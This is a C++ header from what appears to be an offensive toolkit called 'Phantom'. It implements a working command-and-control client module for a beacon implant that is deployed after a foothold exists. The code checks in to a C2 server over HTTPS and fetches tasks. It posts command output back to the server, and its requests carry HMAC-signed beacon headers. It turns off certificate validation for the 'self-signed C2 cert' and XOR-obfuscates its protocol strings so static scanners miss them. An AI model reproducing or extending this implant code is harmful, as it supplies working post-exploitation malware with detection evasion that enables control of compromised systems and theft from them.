#pragma once
// ============================================================================
//  remote_net.h — Phantom Remote Session Module: minimal C2 client.
//
//  Speaks the SAME wire protocol as the beacon (check-in / task / result)
//  but with a deliberately small footprint: no malleable rotation, no
//  evasion stack — this module is dropped AFTER a foothold exists, where
//  the beacon already carries the primary evasion. It reuses the beacon's
//  crypto.h for AES-256-GCM and HMAC-SHA256 request signing.
//
//  Frames are streamed over the SAME HTTPS channel as check-ins (default
//  "beacon channel" mode) so no new port/connection is ever opened — the
//  only difference between `remote start` (slow/stealth) and `remote live`
//  is the cadence.
// ============================================================================

#include <string>
#include <vector>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <sstream>

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
    #include <winhttp.h>
    #pragma comment(lib, "winhttp.lib")
#else
    #include <sys/socket.h>
    #include <sys/select.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <errno.h>
    #include <openssl/ssl.h>
    #include <openssl/err.h>
    #include <openssl/x509.h>
#endif

#include "crypto.h"
#include "remote_obf.h"

namespace remote_net {

// Decrypt an obfuscated literal straight into a std::string (the temporary
// DecryptedString stays alive for the full expression).
#define R_S(s) std::string(R_DEC(R_STR(s)).c_str())

struct RemoteConfig {
#ifdef _WIN32
    std::wstring host;
#else
    std::string  host;
#endif
    int          port      = 8080;
    bool         use_https = true;
    std::string  beacon_id;
#if BEACON_AUTH_ENABLED
    mutable uint64_t request_counter = 0;
    std::array<unsigned char, crypto::AUTH_SECRET_LEN> auth_secret = [] {
        std::array<unsigned char, crypto::AUTH_SECRET_LEN> v{};
        std::copy(BEACON_AUTH_SECRET, BEACON_AUTH_SECRET + crypto::AUTH_SECRET_LEN,
                  v.begin());
        return v;
    }();
#endif
};

static std::string _b64(const std::vector<unsigned char>& d) {
    std::vector<BYTE> b(d.begin(), d.end());
    return crypto::base64_encode(b);
}
static std::vector<unsigned char> _unb64(const std::string& s) {
    auto b = crypto::base64_decode(s);
    return std::vector<unsigned char>(b.begin(), b.end());
}

// JSON string escaping for result payloads.
static std::string json_escape(const std::string& s) {
    std::string res;
    for (unsigned char c : s) {
        if (c == '"') res += "\\\"";
        else if (c == '\\') res += "\\\\";
        else if (c == '\n') res += "\\n";
        else if (c == '\r') res += "\\r";
        else if (c == '\t') res += "\\t";
        else if (c < 0x20) {
            char hex[7];
            snprintf(hex, sizeof(hex), "\\u%04X", c);
            res += hex;
        }
        else res += static_cast<char>(c);
    }
    return res;
}

#ifdef _WIN32
// ── WinHTTP transport (WinHTTP is wide-only) ───────────────────────────────
static std::wstring _to_wide(const std::string& s) {
    std::wstring out;
    for (unsigned char c : s) out += (wchar_t)c;
    return out;
}
static HINTERNET _session = nullptr;
static bool _ensure_session() {
    if (_session) return true;
    _session = WinHttpOpen(_to_wide(R_S("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")).c_str(),
                           WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);
    return _session != nullptr;
}

static std::string _http_request(const RemoteConfig& cfg, const std::string& method,
                                 const std::string& path, const std::string& body,
                                 const std::string& beacon_id) {
    if (!_ensure_session()) return "";
    HINTERNET hConnect = WinHttpConnect(_session, cfg.host.c_str(),
                                        static_cast<INTERNET_PORT>(cfg.port), 0);
    if (!hConnect) return "";
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, _to_wide(method).c_str(), _to_wide(path).c_str(), nullptr,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        cfg.use_https ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); return ""; }

    // Accept self-signed C2 certificate (matches beacon behavior).
    DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));

    // Headers: identity + HMAC auth (same shape the server verifies).
    // All protocol literals are compile-time XOR-obfuscated (remote_obf.h)
    // so static scanners never see plaintext paths/headers in the binary.
    std::wstring headers = _to_wide(R_S("X-Beacon-Id: ") + beacon_id + "\r\n");
#if BEACON_AUTH_ENABLED
    {
        std::string ts = std::to_string(static_cast<long long>(time(nullptr)));
        std::string counter = std::to_string(++cfg.request_counter);
        std::string nonce = crypto::random_hex(16);
        std::string canonical = method + "\n" + path + "\n" + ts + "\n" +
                                counter + "\n" + nonce + "\n" + body;
        std::string sig = crypto::hmac_sha256_hex(canonical, cfg.auth_secret.data(),
                                                  cfg.auth_secret.size());
        headers += _to_wide(R_S("X-Beacon-Timestamp: ") + ts + "\r\n");
        headers += _to_wide(R_S("X-Beacon-Counter: ") + counter + "\r\n");
        headers += _to_wide(R_S("X-Beacon-Nonce: ") + nonce + "\r\n");
        headers += _to_wide(R_S("X-Beacon-Auth: ") + sig + "\r\n");
    }
#endif
    headers += _to_wide(R_S("Content-Type: text/plain\r\n"));

    BOOL sent = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)-1,
                                   body.empty() ? nullptr : const_cast<char*>(body.data()),
                                   (DWORD)body.size(), (DWORD)body.size(), 0);
    if (!sent) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); return ""; }
    if (!WinHttpReceiveResponse(hRequest, nullptr)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); return "";
    }
    std::string out;
    DWORD avail = 0;
    do {
        if (!WinHttpQueryDataAvailable(hRequest, &avail)) break;
        if (!avail) break;
        std::vector<char> buf(avail);
        DWORD read = 0;
        if (!WinHttpReadData(hRequest, buf.data(), avail, &read)) break;
        out.append(buf.data(), read);
    } while (avail > 0);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    return out;
}
#else
// ── Raw socket + OpenSSL transport (Linux/macOS) ───────────────────────────
static std::string _http_request(const RemoteConfig& cfg, const std::string& method,
                                 const std::string& path, const std::string& body,
                                 const std::string& beacon_id) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return "";
    struct hostent* he = gethostbyname(cfg.host.c_str());
    if (!he) { close(fd); return ""; }
    struct sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)cfg.port);
    memcpy(&addr.sin_addr, he->h_addr, he->h_length);
    if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) != 0) { close(fd); return ""; }

    SSL_CTX* ctx = nullptr;
    SSL* ssl = nullptr;
    if (cfg.use_https) {
        SSL_library_init();
        SSL_load_error_strings();
        ctx = SSL_CTX_new(TLS_client_method());
        if (!ctx) { close(fd); return ""; }
        SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr); // self-signed C2 cert
        ssl = SSL_new(ctx);
        if (!ssl) { SSL_CTX_free(ctx); close(fd); return ""; }
        SSL_set_fd(ssl, fd);
        if (SSL_connect(ssl) != 1) { SSL_free(ssl); SSL_CTX_free(ctx); close(fd); return ""; }
    }

    std::string headers = R_S("X-Beacon-Id: ") + beacon_id + "\r\n";
#if BEACON_AUTH_ENABLED
    {
        std::string ts = std::to_string(static_cast<long long>(time(nullptr)));
        std::string counter = std::to_string(++cfg.request_counter);
        std::string nonce = crypto::random_hex(16);
        std::string canonical = method + "\n" + path + "\n" + ts + "\n" +
                                counter + "\n" + nonce + "\n" + body;
        std::string sig = crypto::hmac_sha256_hex(canonical, cfg.auth_secret.data(),
                                                  cfg.auth_secret.size());
        headers += R_S("X-Beacon-Timestamp: ") + ts + "\r\n";
        headers += R_S("X-Beacon-Counter: ") + counter + "\r\n";
        headers += R_S("X-Beacon-Nonce: ") + nonce + "\r\n";
        headers += R_S("X-Beacon-Auth: ") + sig + "\r\n";
    }
#endif
    headers += R_S("Host: ") + cfg.host + ":" + std::to_string(cfg.port) + "\r\n";
    headers += R_S("Content-Type: text/plain\r\n");
    headers += R_S("Content-Length: ") + std::to_string(body.size()) + "\r\n";
    headers += R_S("Connection: close\r\n\r\n");

    std::string req = method + " " + path + R_S(" HTTP/1.1\r\n") + headers + body;
    auto send_all = [&](const std::string& data) -> bool {
        size_t off = 0;
        while (off < data.size()) {
            int n = ssl ? SSL_write(ssl, data.data() + off, (int)(data.size() - off))
                        : (int)send(fd, data.data() + off, data.size() - off, 0);
            if (n <= 0) return false;
            off += (size_t)n;
        }
        return true;
    };
    if (!send_all(req)) {
        if (ssl) { SSL_free(ssl); SSL_CTX_free(ctx); }
        close(fd);
        return "";
    }

    std::string resp;
    char buf[8192];
    for (;;) {
        int n = ssl ? SSL_read(ssl, buf, sizeof(buf))
                    : (int)recv(fd, buf, sizeof(buf), 0);
        if (n <= 0) break;
        resp.append(buf, (size_t)n);
    }
    if (ssl) { SSL_free(ssl); SSL_CTX_free(ctx); }
    close(fd);
    // split headers/body
    size_t p = resp.find("\r\n\r\n");
    return p == std::string::npos ? "" : resp.substr(p + 4);
}
#endif

// ── Protocol helpers ────────────────────────────────────────────────────────

inline std::string checkin(const RemoteConfig& cfg, const std::string& payload = "") {
    std::string method = payload.empty() ? R_S("GET") : R_S("POST");
    std::string body = payload.empty() ? "" : crypto::encrypt(payload);
    std::string resp = _http_request(cfg, method, R_S("/api/v1/ping"), body, cfg.beacon_id);
    if (resp.empty()) return "";
    return crypto::decrypt(resp);
}

inline bool send_result(const RemoteConfig& cfg, const std::string& task_id,
                        const std::string& output) {
    std::string json = R_S("{\"task_id\":\"") + task_id + R_S("\",\"output\":\"") +
                       json_escape(output) + R_S("\"}");
    std::string enc = crypto::encrypt(json);
    if (enc.empty()) return false;
    std::string resp = _http_request(cfg, R_S("POST"), R_S("/api/v1/result"), enc, cfg.beacon_id);
    return !resp.empty();
}

// ── Minimal task-list parser ({"tasks":[{"task_id":...,"command":...},...]}) ─
struct RemoteTask {
    std::string task_id;
    std::string command;
};

// Find the value of a JSON string key, tolerant of whitespace and ordering:
//   "task_id": "abc"   or   "task_id":"abc"
// Returns true and fills `value` when found at/after `pos`.
static bool _json_str_value(const std::string& json, const std::string& key,
                            size_t pos, std::string& value, size_t& after) {
    std::string pat = "\"" + key + "\"";
    size_t k = json.find(pat, pos);
    if (k == std::string::npos) return false;
    size_t p = k + pat.size();
    // skip spaces/colon
    while (p < json.size() && (json[p] == ' ' || json[p] == '\t' || json[p] == ':')) ++p;
    if (p >= json.size() || json[p] != '"') return false;
    ++p;
    std::string raw;
    while (p < json.size() && json[p] != '"') {
        if (json[p] == '\\' && p + 1 < json.size()) {
            char n = json[p + 1];
            if (n == 'n') raw += '\n';
            else if (n == 'r') raw += '\r';
            else if (n == 't') raw += '\t';
            else if (n == '"') raw += '"';
            else if (n == '\\') raw += '\\';
            else { raw += json[p]; raw += n; }
            ++p;
        } else {
            raw += json[p];
        }
        ++p;
    }
    value = raw;
    after = p + 1;
    return true;
}

inline std::vector<RemoteTask> parse_tasks(const std::string& json) {
    std::vector<RemoteTask> out;
    size_t pos = 0;
    while (true) {
        // locate the next "task_id" after pos; bail when the array ends
        std::string tid, cmd;
        size_t after = 0;
        if (!_json_str_value(json, "task_id", pos, tid, after)) break;
        // the command for THIS task must come after its task_id
        size_t after2 = 0;
        if (!_json_str_value(json, "command", after - 1, cmd, after2)) break;
        out.push_back({tid, cmd});
        pos = after2;
        if (pos == 0 || pos >= json.size()) break;
    }
    return out;
}

} // namespace remote_net